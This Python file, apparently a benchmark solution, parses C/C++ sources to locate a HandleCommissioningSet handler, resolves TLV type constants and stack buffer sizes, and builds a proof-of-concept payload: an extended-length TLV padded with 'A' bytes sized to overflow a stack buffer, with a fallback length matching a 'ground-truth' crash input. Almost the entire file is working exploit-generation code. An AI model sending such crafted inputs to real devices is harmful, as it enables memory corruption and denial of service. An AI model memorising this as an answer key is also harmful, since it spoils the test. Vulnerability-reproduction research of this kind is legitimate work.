import os
import re
import tarfile
import tempfile
import ast
from typing import Dict, Optional, Tuple, List


def _read_text_file(path: str, max_bytes: int = 2_000_000) -> Optional[str]:
    try:
        st = os.stat(path)
        if st.st_size > max_bytes:
            return None
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            return None
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _iter_sources_from_dir(root: str) -> List[Tuple[str, str]]:
    out = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not any(fn.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".ipp")):
                continue
            p = os.path.join(dirpath, fn)
            txt = _read_text_file(p)
            if txt is not None and txt:
                out.append((p, txt))
    return out


def _iter_sources_from_tar(tar_path: str) -> List[Tuple[str, str]]:
    out = []
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".ipp")):
                    continue
                if m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(2_000_000 + 1)
                    if len(data) > 2_000_000:
                        continue
                    txt = data.decode("utf-8", errors="ignore")
                    if txt:
                        out.append((name, txt))
                except Exception:
                    continue
    except Exception:
        return []
    return out


_scope_re = re.compile(r"(?:(?:[A-Za-z_]\w*)::)+([A-Za-z_]\w*)")


def _strip_scopes(s: str) -> str:
    while True:
        ns = _scope_re.sub(r"\1", s)
        if ns == s:
            return s
        s = ns


_cast_re = re.compile(r"\(\s*(?:const\s+)?(?:volatile\s+)?[A-Za-z_]\w*(?:::[A-Za-z_]\w*)*(?:\s*[*&])?\s*\)")
_static_cast_re = re.compile(r"\bstatic_cast\s*<[^>]+>\s*\(")
_reinterpret_cast_re = re.compile(r"\breinterpret_cast\s*<[^>]+>\s*\(")
_const_cast_re = re.compile(r"\bconst_cast\s*<[^>]+>\s*\(")
_sizeof_re = re.compile(r"\bsizeof\s*\([^)]*\)")
_numeric_suffix_re = re.compile(r"(\b0x[0-9A-Fa-f]+|\b\d+)\s*(?:[uUlL]{1,3})\b")


def _sanitize_cpp_expr(expr: str) -> str:
    e = expr.strip()
    e = _strip_scopes(e)
    e = _static_cast_re.sub("(", e)
    e = _reinterpret_cast_re.sub("(", e)
    e = _const_cast_re.sub("(", e)
    e = _cast_re.sub("", e)
    e = _sizeof_re.sub("0", e)
    e = _numeric_suffix_re.sub(r"\1", e)
    e = e.replace("true", "1").replace("false", "0")
    e = re.sub(r"/\*.*?\*/", "", e, flags=re.S)
    e = re.sub(r"//.*", "", e)
    e = e.strip()
    return e


class _SafeEval(ast.NodeVisitor):
    __slots__ = ("names",)

    def __init__(self, names: Dict[str, int]):
        self.names = names

    def visit_Expression(self, node: ast.Expression):
        return self.visit(node.body)

    def visit_Constant(self, node: ast.Constant):
        if isinstance(node.value, (int, bool)):
            return int(node.value)
        raise ValueError("bad const")

    def visit_Num(self, node: ast.Num):
        return int(node.n)

    def visit_Name(self, node: ast.Name):
        if node.id in self.names:
            return int(self.names[node.id])
        raise KeyError(node.id)

    def visit_UnaryOp(self, node: ast.UnaryOp):
        v = self.visit(node.operand)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        raise ValueError("bad unary")

    def visit_BinOp(self, node: ast.BinOp):
        l = self.visit(node.left)
        r = self.visit(node.right)
        op = node.op
        if isinstance(op, ast.Add):
            return l + r
        if isinstance(op, ast.Sub):
            return l - r
        if isinstance(op, ast.Mult):
            return l * r
        if isinstance(op, ast.FloorDiv):
            if r == 0:
                raise ZeroDivisionError
            return l // r
        if isinstance(op, ast.Div):
            if r == 0:
                raise ZeroDivisionError
            return l // r
        if isinstance(op, ast.Mod):
            if r == 0:
                raise ZeroDivisionError
            return l % r
        if isinstance(op, ast.LShift):
            return l << r
        if isinstance(op, ast.RShift):
            return l >> r
        if isinstance(op, ast.BitOr):
            return l | r
        if isinstance(op, ast.BitAnd):
            return l & r
        if isinstance(op, ast.BitXor):
            return l ^ r
        raise ValueError("bad binop")

    def visit_Call(self, node: ast.Call):
        raise ValueError("no calls")

    def visit_Attribute(self, node: ast.Attribute):
        raise ValueError("no attrs")

    def generic_visit(self, node):
        raise ValueError(f"bad node {type(node).__name__}")


def _safe_eval_int(expr: str, names: Dict[str, int]) -> int:
    e = _sanitize_cpp_expr(expr)
    if not e:
        raise ValueError("empty expr")
    tree = ast.parse(e, mode="eval")
    return int(_SafeEval(names).visit(tree))


def _extract_constant_exprs(texts: List[Tuple[str, str]]) -> Dict[str, str]:
    const_exprs: Dict[str, str] = {}

    define_re = re.compile(r"^[ \t]*#define[ \t]+([A-Za-z_]\w*)[ \t]+(.+?)[ \t]*(?:/[/\*].*)?$", re.M)
    constexpr_re = re.compile(r"\b(?:static\s+)?constexpr\b[^;=\n]*\b([A-Za-z_]\w*)\s*=\s*([^;]+);")
    const_re = re.compile(r"\b(?:static\s+)?const\b[^;=\n]*\b([A-Za-z_]\w*)\s*=\s*([^;]+);")
    enum_block_re = re.compile(r"\benum\b[^;{]*\{(.*?)\}\s*;", re.S)

    for _, t in texts:
        for m in define_re.finditer(t):
            name, expr = m.group(1), m.group(2)
            if name and expr:
                const_exprs.setdefault(name, expr.strip())
        for m in constexpr_re.finditer(t):
            name, expr = m.group(1), m.group(2)
            if name and expr:
                const_exprs.setdefault(name, expr.strip())
        for m in const_re.finditer(t):
            name, expr = m.group(1), m.group(2)
            if name and expr:
                const_exprs.setdefault(name, expr.strip())
        for m in enum_block_re.finditer(t):
            block = m.group(1)
            members = block.split(",")
            for mem in members:
                mm = re.search(r"\b([A-Za-z_]\w*)\s*=\s*([^,}]+)", mem)
                if mm:
                    name, expr = mm.group(1), mm.group(2)
                    if name and expr:
                        const_exprs.setdefault(name, expr.strip())

    return const_exprs


def _resolve_constants(const_exprs: Dict[str, str], max_iter: int = 20) -> Dict[str, int]:
    resolved: Dict[str, int] = {}
    pending = dict(const_exprs)

    for _ in range(max_iter):
        progress = False
        to_del = []
        for name, expr in pending.items():
            try:
                val = _safe_eval_int(expr, resolved)
                resolved[name] = int(val)
                to_del.append(name)
                progress = True
            except Exception:
                continue
        for name in to_del:
            pending.pop(name, None)
        if not progress:
            break
    return resolved


def _find_function_block(text: str, func_name: str) -> Optional[str]:
    idx = text.find(func_name)
    if idx < 0:
        return None
    par = text.find("(", idx)
    if par < 0:
        return None
    brace = text.find("{", par)
    if brace < 0:
        return None

    i = brace
    n = len(text)
    depth = 0
    in_squote = False
    in_dquote = False
    in_line_comment = False
    in_block_comment = False
    esc = False

    while i < n:
        c = text[i]
        nxt = text[i + 1] if i + 1 < n else ""

        if in_line_comment:
            if c == "\n":
                in_line_comment = False
            i += 1
            continue

        if in_block_comment:
            if c == "*" and nxt == "/":
                in_block_comment = False
                i += 2
            else:
                i += 1
            continue

        if in_squote:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == "'":
                in_squote = False
            i += 1
            continue

        if in_dquote:
            if esc:
                esc = False
            elif c == "\\":
                esc = True
            elif c == '"':
                in_dquote = False
            i += 1
            continue

        if c == "/" and nxt == "/":
            in_line_comment = True
            i += 2
            continue
        if c == "/" and nxt == "*":
            in_block_comment = True
            i += 2
            continue
        if c == "'":
            in_squote = True
            i += 1
            continue
        if c == '"':
            in_dquote = True
            i += 1
            continue

        if c == "{":
            if depth == 0:
                start = i
            depth += 1
        elif c == "}":
            depth -= 1
            if depth == 0:
                end = i + 1
                return text[start:end]
        i += 1
    return None


def _analyze_handle_commissioning_set(func_block: str, constants: Dict[str, int]) -> Tuple[Optional[int], Optional[int], Optional[int]]:
    buf_decl_re = re.compile(r"\buint8_t\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+)\s*\]\s*;")
    buffers: Dict[str, Optional[int]] = {}
    for m in buf_decl_re.finditer(func_block):
        name = m.group(1)
        expr = m.group(2)
        sz = None
        try:
            sz = _safe_eval_int(expr, constants)
            if sz <= 0 or sz > 1_000_000:
                sz = None
        except Exception:
            sz = None
        buffers[name] = sz

    # Find candidate copy/read operations involving those buffers and a TLV-derived length.
    call_re = re.compile(r"\b(Read|memcpy|memmove)\s*\(([^;]*?)\)\s*;")
    case_re = re.compile(r"\bcase\s+([^:]+)\s*:")
    cases = [(m.start(), m.group(1).strip()) for m in case_re.finditer(func_block)]

    def nearest_case_label(pos: int) -> Optional[str]:
        best = None
        best_pos = -1
        for p, lab in cases:
            if p < pos and p > best_pos:
                best_pos = p
                best = lab
        return best

    def parse_type_value(label: str) -> Optional[int]:
        s = _sanitize_cpp_expr(label)
        s = s.strip()
        if not s:
            return None
        try:
            # numeric literal?
            if re.fullmatch(r"0x[0-9A-Fa-f]+|\d+", s):
                return int(s, 0) & 0xFF
        except Exception:
            pass
        s = _strip_scopes(s)
        s = re.sub(r"[^A-Za-z0-9_]", "", s)
        if s in constants:
            return int(constants[s]) & 0xFF
        if s.startswith("k") and s in constants:
            return int(constants[s]) & 0xFF
        return None

    best_type = None
    best_bufsz = None
    best_needed = None

    for m in call_re.finditer(func_block):
        call_name = m.group(1)
        args = m.group(2)
        if "GetLength" not in args and "GetSize" not in args and "tlv" not in args and "Tlv" not in args:
            continue

        for buf_name, buf_sz in buffers.items():
            if buf_sz is None:
                continue
            if re.search(r"\b" + re.escape(buf_name) + r"\b", args) is None:
                continue

            # If a TLV-derived length is used, assume we can overflow buf_sz by setting extended length > buf_sz.
            needed = buf_sz + 1
            lab = nearest_case_label(m.start())
            tval = parse_type_value(lab) if lab else None

            # Prefer smallest buffer for shorter PoC, but also prefer a known type.
            score = 0
            if tval is not None:
                score += 10_000
            score -= needed  # smaller needed => higher score
            if best_needed is None or score > (10_000 if best_type is not None else 0) - best_needed:
                best_type, best_bufsz, best_needed = tval, buf_sz, needed

    # Also try to infer a session-id TLV type to include a tiny valid-looking TLV.
    session_type = None
    for k, v in constants.items():
        if v < 256 and ("SessionId" in k or "SessionID" in k or "CommissionerSessionId" in k):
            session_type = int(v) & 0xFF
            break

    return best_type, best_needed, session_type


def _choose_fallback_type(constants: Dict[str, int]) -> int:
    candidates = []
    for k, v in constants.items():
        if not isinstance(v, int):
            continue
        if v < 0 or v > 255:
            continue
        if "CommissionerId" in k or ("Commissioner" in k and "Id" in k):
            candidates.append((0, k, v))
        elif "SteeringData" in k:
            candidates.append((1, k, v))
        elif "BorderAgentLocator" in k:
            candidates.append((2, k, v))
        elif "JoinerUdpPort" in k:
            candidates.append((3, k, v))
        elif "Commissioner" in k:
            candidates.append((4, k, v))
    if candidates:
        candidates.sort()
        return int(candidates[0][2]) & 0xFF
    # As a last resort, pick a small commonly-used TLV-ish type that won't be 0xFF.
    return 0x00


def _build_extended_tlv(t: int, length: int, payload_byte: int = 0x41, endian: str = "big") -> bytes:
    if length < 0:
        length = 0
    if length > 0xFFFF:
        length = 0xFFFF
    hdr = bytes([t & 0xFF, 0xFF]) + int(length).to_bytes(2, endian, signed=False)
    return hdr + bytes([payload_byte]) * length


def _build_normal_tlv(t: int, value: bytes) -> bytes:
    ln = len(value)
    if ln > 255:
        value = value[:255]
        ln = 255
    return bytes([t & 0xFF, ln & 0xFF]) + value


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Load sources
        if os.path.isdir(src_path):
            texts = _iter_sources_from_dir(src_path)
        else:
            texts = _iter_sources_from_tar(src_path)

        const_exprs = _extract_constant_exprs(texts)
        constants = _resolve_constants(const_exprs)

        # Find HandleCommissioningSet function block
        func_block = None
        for _, t in texts:
            if "HandleCommissioningSet" in t:
                blk = _find_function_block(t, "HandleCommissioningSet")
                if blk:
                    func_block = blk
                    break

        tlv_type = None
        needed_len = None
        session_type = None
        if func_block:
            tlv_type, needed_len, session_type = _analyze_handle_commissioning_set(func_block, constants)

        if tlv_type is None:
            tlv_type = _choose_fallback_type(constants)

        # Choose a conservative overflow length: minimal if we found it, else ground-truth-like.
        if needed_len is None or needed_len <= 0:
            needed_len = 840  # yields 844 total bytes with extended header

        # Some targets store up to ~1k on stack; keep within typical limits but still overflow.
        if needed_len < 260:
            needed_len = 260
        if needed_len > 2000:
            needed_len = 2000

        # Build PoC: optional small session-id TLV + malicious extended-length TLV
        parts = []
        if session_type is not None:
            parts.append(_build_normal_tlv(session_type, b"\x00\x01"))
        parts.append(_build_extended_tlv(tlv_type, needed_len, payload_byte=0x41, endian="big"))
        return b"".join(parts)